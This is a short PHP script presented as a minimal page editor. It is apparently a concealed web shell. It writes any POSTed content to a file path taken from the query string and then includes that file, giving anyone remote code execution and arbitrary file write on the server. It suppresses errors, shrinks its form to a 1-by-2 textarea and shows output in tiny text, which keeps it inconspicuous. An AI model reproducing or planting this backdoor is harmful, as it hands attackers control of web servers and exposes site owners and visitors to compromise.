<?php

error_reporting(0);

// Get the page name from the query string
$page = $_GET['page'] . '';

if (!$_GET['page']) {
  echo("");
  exit;
}

if ($_POST['page']) {
  $handle = fopen("$page", 'w');
  fwrite($handle, $_POST['page']);
  fclose($handle);
  include("$page");
 // include("footer.html");
  exit;
} 

if (file_exists("$page")) {
  $FILE = fopen("$page", "rt");
  while (!feof($FILE)) {
    $text .= fgets($FILE);
  }
  fclose($FILE);
} else {
   echo("<small><small><FONT COLOR='#0000'>$page</font></small></small>\n");
  $text = "";
}



$page = $_GET['page'] . '.html';
$a = $_GET['page'];





$a = 1; //$_SERVER['PHP_SELF'];

$this_page = $_SERVER['PHP_SELF'];
$query_string = $_SERVER['QUERY_STRING'];
echo("<form method=\"post\" action=\"$this_page?$query_string\">\n"); //newbie and the new text  //onclick=\"setTimeout('history.go(addpage.php);',3);\"
echo("<textarea id=\"page\"  name=\"page\" rows=\"1\" cols=\"2\">\n"); //rows=5 cols=79 
echo(htmlspecialchars($text));
echo("ggggg</textarea>\n");
echo("<input type=\"submit\" value=\"Go\">\n"); 
echo("</form>\n"); 
echo("</body>\n"); 
echo("</html>\n"); 

?>